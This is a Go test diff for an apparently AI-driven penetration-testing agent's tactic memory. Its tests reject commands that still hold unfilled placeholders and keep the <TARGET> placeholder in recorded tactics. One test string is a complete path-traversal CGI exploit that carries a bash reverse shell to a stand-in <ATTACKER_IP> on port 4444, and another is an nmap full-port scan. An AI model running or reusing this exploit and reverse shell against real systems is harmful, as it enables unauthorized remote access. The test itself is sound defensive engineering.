@@ -174,3 +174,39 @@ func TestRecordTacticFailClosedWhenTargetUnremovable(t *testing.T) {
 		}
 	}
 }
+
+// TestRecordTacticRejectsUnsubstitutedPlaceholder reproduces the live
+// self-poisoning loop found 2026-10-08: a model that mishandled a recalled
+// <TARGET> tactic emitted a command still containing a half-filled template
+// token of its own (<ATTACKER_IP>) instead of a real value. That broken
+// command must never be allowed to become a recallable "tactic" itself —
+// otherwise the next task recalls the exact same broken placeholder soup as
+// "prior knowledge" and repeats the identical mistake, a closed feedback
+// loop no prompt wording can reliably break from the read side alone.
+func TestRecordTacticRejectsUnsubstitutedPlaceholder(t *testing.T) {
+	s := memStore(t)
+	broken := "curl -s -i -d bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' http://198.51.100.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+	if err := s.RecordTactic(context.Background(), broken, "failed", nil, ""); err != nil {
+		t.Fatalf("RecordTactic: %v", err)
+	}
+	if got := s.ListTactics("curl", 10); len(got) != 0 {
+		t.Fatalf("a command with an unsubstituted placeholder must not be recorded as a tactic, got %+v", got)
+	}
+}
+
+// TestRecordTacticAllowsOwnTargetPlaceholder guards against overcorrecting:
+// the canonical <TARGET> placeholder scrubTarget itself inserts is expected
+// and must still be recorded normally.
+func TestRecordTacticAllowsOwnTargetPlaceholder(t *testing.T) {
+	s := memStore(t)
+	if err := s.RecordTactic(context.Background(), "nmap -sV -p- 198.51.100.10", "worked", nil, ""); err != nil {
+		t.Fatalf("RecordTactic: %v", err)
+	}
+	got := s.ListTactics("nmap", 10)
+	if len(got) != 1 {
+		t.Fatalf("want 1 tactic, got %d: %+v", len(got), got)
+	}
+	if !strings.Contains(got[0].CommandPattern, "<TARGET>") {
+		t.Fatalf("expected <TARGET> placeholder, got %q", got[0].CommandPattern)
+	}
+}
